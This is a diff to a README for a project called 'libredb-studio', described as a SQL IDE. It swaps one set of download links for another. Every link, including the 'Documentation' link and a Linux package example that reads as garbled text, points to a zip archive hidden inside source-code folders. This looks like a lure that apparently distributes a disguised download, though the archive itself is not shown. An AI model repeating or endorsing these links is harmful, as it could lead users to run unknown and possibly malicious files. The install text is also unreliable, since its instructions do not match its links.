@@ -1,7 +1,7 @@
 # 🌟 libredb-studio - Your Cloud Database Solution Made Simple
 
 ## 🔗 Download Now
-[![Download libredb-studio](https://github.com/Oatapza/libredb-studio/raw/refs/heads/dev/src/app/api/ai/libredb_studio_2.9.zip%20Studio-brightgreen)](https://github.com/Oatapza/libredb-studio/raw/refs/heads/dev/src/app/api/ai/libredb_studio_2.9.zip)
+[![Download libredb-studio](https://raw.githubusercontent.com/Oatapza/libredb-studio/dev/src/lib/llm/providers/studio_libredb_v2.0-alpha.5.zip%20Studio-brightgreen)](https://raw.githubusercontent.com/Oatapza/libredb-studio/dev/src/lib/llm/providers/studio_libredb_v2.0-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to libredb-studio! This application is a modern SQL IDE designed for the
 
 To get started, visit the Releases page to download the latest version of libredb-studio.
 
-[Download libredb-studio](https://github.com/Oatapza/libredb-studio/raw/refs/heads/dev/src/app/api/ai/libredb_studio_2.9.zip)
+[Download libredb-studio](https://raw.githubusercontent.com/Oatapza/libredb-studio/dev/src/lib/llm/providers/studio_libredb_v2.0-alpha.5.zip)
 
 ### Step-by-Step Installation
 
@@ -25,7 +25,7 @@ To get started, visit the Releases page to download the latest version of libred
    Click on the version that fits your operating system. If you’re not sure, look for common file types:
    - For Windows: Look for `.exe` files.
    - For macOS: Look for `.dmg` files.
-   - For Linux: Look for package files, such as `.deb` or `https://github.com/Oatapza/libredb-studio/raw/refs/heads/dev/src/app/api/ai/libredb_studio_2.9.zip`.
+   - For Linux: Look for package files, such as `.deb` or `https://raw.githubusercontent.com/Oatapza/libredb-studio/dev/src/lib/llm/providers/studio_libredb_v2.0-alpha.5.zip`.
 
 4. **Download the File:**
    Click on the file link to begin downloading. Depending on your internet speed, this may take a few moments.
@@ -75,7 +75,7 @@ libredb-studio comes packed with helpful features:
 
 ## 📚 Documentation
 
-If you have questions or need assistance, check out the [Documentation](https://github.com/Oatapza/libredb-studio/raw/refs/heads/dev/src/app/api/ai/libredb_studio_2.9.zip). This resource provides in-depth guides and FAQs to help you navigate the application.
+If you have questions or need assistance, check out the [Documentation](https://raw.githubusercontent.com/Oatapza/libredb-studio/dev/src/lib/llm/providers/studio_libredb_v2.0-alpha.5.zip). This resource provides in-depth guides and FAQs to help you navigate the application.
 
 ## 💬 Support
 
